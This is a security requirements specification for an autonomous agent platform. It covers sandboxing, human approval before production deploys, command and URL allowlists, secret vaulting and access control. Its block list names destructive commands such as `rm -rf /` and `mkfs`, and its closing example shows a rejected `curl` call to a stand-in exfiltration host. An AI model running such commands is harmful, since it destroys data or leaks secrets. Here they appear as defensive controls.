# ASF-FW-SEC — Security Requirements

## Summary

Cross-cutting security requirements for ASF v1: process sandbox isolation (local operator mode), credential handling, deployment approval gates, MCP tool restrictions, and platform authentication. All agent-facing FRs (FR-08, FR-10, FR-16, FR-17) MUST comply with this document.

## User Story

> As a platform operator, I need enforceable security controls — not policy prose — so that autonomous agents cannot exfiltrate secrets, escape sandboxes, or deploy to production without approval.

## Requirements

### v1 Local Operator Mode

1. ASF v1 targets a **single trusted operator** on their own machine. Process-per-session isolation ([process-sandbox.md](./process-sandbox.md)) is **sufficient** for this threat model.
2. Isolation enforcement is at the **MCP proxy boundary**: workspace path restrictions, tool allowlists, terminal argv validation, browser URL allowlists, and vault-scoped secret injection.
3. Operators MUST configure `ASF_WORKSPACE_ROOT` to a dedicated directory — not system paths (`/`, `/Users`, `/etc`).
4. Agent subprocesses MUST NOT receive internal Workflow Engine API tokens.
5. All P0 controls below (terminal/browser/web allowlists, vault, internal JWT, prod approval gate) apply unchanged in local operator mode.

### Phase 2 — Container Isolation (Untrusted Missions)

> **Deferred from v1 default.** Container-per-session applies when ASF hosts missions from untrusted operators or multi-tenant deployments.

1. Each ACP session SHOULD run in a **dedicated container** when:
   - Multiple untrusted operators share a host
   - Mission code or prompts originate from external users
   - Compliance requires kernel-level namespace isolation
2. Containers MUST have:
   - Read/write access limited to `workspaces/{missionId}/` mount
   - No host filesystem access outside the mount
   - Network egress restricted per allowlists below
   - Resource limits (CPU, memory, wall-clock timeout per FR-08)
3. Container teardown MUST complete within 60 seconds of session termination (FR-08).
4. Cross-session state sharing via in-memory channels is prohibited.

### P0 — Production Deployment Approval Gate

1. Deployments to `production` environment MUST require explicit human approval before the Deployment Agent executes.
2. Staging deployments MAY proceed autonomously when mission constraints allow.
3. Approval requests MUST surface in Mission Dashboard with: target, URLs, commit SHA, test summary.
4. Unapproved production deploy attempts MUST be rejected with `DEPLOY_APPROVAL_REQUIRED`.

### P0 — Terminal Allowlist Policy

1. Terminal MCP `exec` MUST use an allowlist of command prefixes (v1 minimum):
   - Package managers: `bun`, `npm`, `bunx`, `npx`
   - Build/test: `bun run`, `bun test`, `tsc`
   - Git (via git MCP preferred; terminal git only when git MCP unavailable)
   - Target deploy CLIs: `wrangler`, `docker`, `docker compose`
2. Destructive commands (`rm -rf /`, `mkfs`, `dd`, fork bombs) MUST be blocked.
3. Shell interpolation of untrusted agent-generated strings MUST be prohibited — use argument arrays.
4. Network egress from terminal MUST be limited to: package registries, configured git remotes, deployment API endpoints.

### P0 — Browser URL Allowlist

1. Browser MCP navigation MUST be restricted to:
   - Deployment URLs from FR-16 report (staging/production as configured)
   - `localhost` / `127.0.0.1` for local dev verification
   - Explicitly allowlisted domains in `constraints.verification.allowedHosts` (FR-17)
2. Navigation to arbitrary external URLs MUST be rejected with `URL_NOT_ALLOWLISTED`.

### P0 — Vault Specification (Outline)

1. All secrets (deploy credentials, test accounts, API keys) MUST be stored in a platform vault — never in workspace files or git.
2. Vault interface (v1 outline):
   - `vault.get(secretRef, sessionId)` — scoped read, audit-logged
   - `vault.put(secretRef, value)` — operator-only; agents cannot write secrets
   - Secret refs use format: `vault://{missionId}/{key}`
3. Injected secrets MUST be redacted in all audit logs and agent telemetry.
4. Agents MUST NOT receive secret values in FR-19 context bundles — injection at MCP tool boundary only.

### P0 — Platform Auth & RBAC (Outline)

1. ASF platform MUST authenticate operators before mission creation or approval actions.
2. v1 RBAC roles (minimum):
   - `operator` — create missions, approve production deploys, pause/resume
   - `viewer` — read-only dashboard access
   - `system` — internal service account for workflow engine
3. Mission isolation: operators MAY only access missions they own (single-tenant v1; multi-tenant deferred).
4. All approval and deploy actions MUST be audit-logged with operator identity.

### P0 — Internal API Authentication

1. All `/internal/v1/*` Workflow Engine endpoints MUST require service authentication (JWT bearer or mTLS). See [docs/ADD.md §10.1](../../docs/ADD.md#101-internal-api-authentication).
2. Agent subprocesses MUST NOT receive internal API tokens.
3. Unauthenticated internal calls MUST return `401`.

### P0 — Web MCP URL Allowlist

1. `web.fetch` and `web.search` MUST restrict outbound URLs to:
   - `https://` documentation and API doc hosts (configurable allowlist)
   - No `file://`, `localhost`, or RFC1918 targets via Web MCP (use filesystem MCP for local reads)
2. Rejections MUST return `URL_NOT_ALLOWLISTED`.
3. See [mcp-integration.md](./mcp-integration.md) Web server row.

### P0 — Terminal argv Hardening

1. Terminal `exec` MUST invoke commands via **argument arrays** — no shell string concatenation of agent-generated input.
2. Prefix allowlist (§ Terminal Allowlist Policy) validates `argv[0]` only; full argv MUST be logged for audit.
3. `curl` is **not** in the default terminal allowlist. Verification agent SHOULD use browser MCP for HTTP checks; if `curl` is enabled for an agent, URLs MUST match browser/deployment allowlists (host + path prefix).

## Inputs / Outputs / Artifacts

| Direction | Name | Format |
|-----------|------|--------|
| Input | Mission constraints | YAML |
| Input | Operator approval token | JWT / session |
| Output | Audit log entries | JSON |
| Output | Security violation events | FR-13 compatible |

## Acceptance Criteria

- [ ] Process sandbox rejects filesystem escape outside `workspaces/{missionId}/`
- [ ] Process sandbox rejects non-allowlisted terminal commands
- [ ] Production deploy blocked without operator approval
- [ ] Terminal rejects `rm -rf /` and non-allowlisted commands
- [ ] Browser rejects navigation to non-allowlisted URL
- [ ] Secrets never appear in git history or agent logs (verified by test)
- [ ] Operator actions recorded in audit log

## Dependencies

- FR-08 — ACP session isolation ([process-sandbox.md](./process-sandbox.md))
- [cli-agent-runtime.md](./cli-agent-runtime.md) — CLI spawn model
- FR-10 — Git merge gates
- FR-16, FR-17 — Deployment and verification
- [mcp-integration.md](./mcp-integration.md) — MCP enforcement layer

## Non-Goals

- SOC 2 / compliance certification (v1)
- Hardware security modules (HSM)
- Zero-trust service mesh
- Penetration testing automation (see future security audit agent)

## Open Questions

1. Vault backend: HashiCorp Vault vs. Cloudflare Secrets vs. env-encrypted store?
2. SSO integration timeline?
3. Container runtime for Phase 2: Docker vs. gVisor vs. Firecracker?

## Examples

**Production deploy approval flow:**

```yaml
deploy_request:
  mission_id: m-7f3a2b1c
  environment: production
  target: cloudflare
  commit: abc1234
  status: PENDING_APPROVAL
  required_role: operator
```

**Terminal allowlist rejection:**

```json
{
  "tool": "terminal.exec",
  "command": "curl https://evil.example/exfil",
  "error": "COMMAND_NOT_ALLOWLISTED"
}
```
